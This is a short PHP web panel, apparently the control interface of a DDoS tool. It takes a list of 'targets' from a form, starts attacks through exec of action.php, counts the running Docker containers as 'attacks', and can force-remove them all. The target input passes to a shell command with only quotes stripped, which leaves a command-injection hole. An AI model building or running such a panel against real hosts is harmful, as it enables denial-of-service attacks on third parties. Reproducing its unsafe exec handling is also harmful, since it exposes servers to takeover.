<?php
if (isset($_POST['targets'])) {

    $targets = $_POST['targets'];

    $targets = str_replace('"', '', $targets);
    $targets = str_replace("'", '', $targets);
    $s = '"';

    $command = "php action.php " . $s . $targets . $s;

    exec($command);
}

if (isset($_POST['stop'])){
    file_put_contents('rule', 'stop');
    while ((integer)(exec('docker ps -q | wc -l')) > 0){
        exec('docker rm --force $(docker ps -a -q)');
    }

} else {
    file_put_contents('rule', 'start');
}

require_once 'helpers.php';
$memavaible = (integer)getSystemMemInfo()['MemAvailable'];

echo 'free memory - ' . (integer)($memavaible / 1000) . 'mb';

$count_of_attacks = exec('docker ps -q | wc -l');
echo '<br>';
echo 'count of attacks that are running- '.$count_of_attacks;

?>

<html lang="en">
<head>
    <title>ddos</title>
</head>
<body>
<form action="/" method="post">

    <br>
    <label>
        <textarea placeholder="targets" name="targets"></textarea>
    </label>

    <button type="submit">action</button>
</form>

<form action="" method="post">
    <label for="">
        <input type="hidden" name="stop" value="1">
    </label>
    <button type="submit">Stop</button>
</form>


<h1><a href="/">home</a></h1>

</body>
</html>
